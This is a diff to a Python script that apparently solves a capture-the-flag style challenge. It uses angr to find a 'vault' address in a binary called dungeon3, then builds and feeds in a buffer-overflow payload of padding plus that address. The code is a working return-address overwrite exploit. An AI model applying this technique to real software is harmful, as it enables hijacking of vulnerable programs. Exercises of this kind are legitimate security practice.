@@ -13,9 +13,14 @@ def find_vault_address(binary_path):
 
     return vault_addr
 
-def exploit_dungeon3(buffer_size, vault_addr):
+def exploit_dungeon3(buffer_size):
     binary_path = './dungeon3'
     proj = angr.Project(binary_path, auto_load_libs=False)
+
+    vault_addr = find_vault_address(binary_path)
+    if not vault_addr:
+        print("Vault address not found.")
+        return
 
     buffer_overflow_input = b'A' * buffer_size + vault_addr.to_bytes(8, 'little')
 
@@ -28,11 +33,5 @@ def exploit_dungeon3(buffer_size, vault_addr):
     subprocess.run(["./dungeon3"], stdin=open("payload.txt", "rb"), check=True)
 
 if __name__ == "__main__":
-    binary_path = './dungeon3'
-    vault_addr = find_vault_address(binary_path)
-    if vault_addr:
-        print(f"Vault address: 0x{vault_addr:016x}")
-        buffer_size = 40
-        exploit_dungeon3(buffer_size, vault_addr)
-    else:
-        print("Vault address not found.")
+    buffer_size = 40
+    exploit_dungeon3(buffer_size)
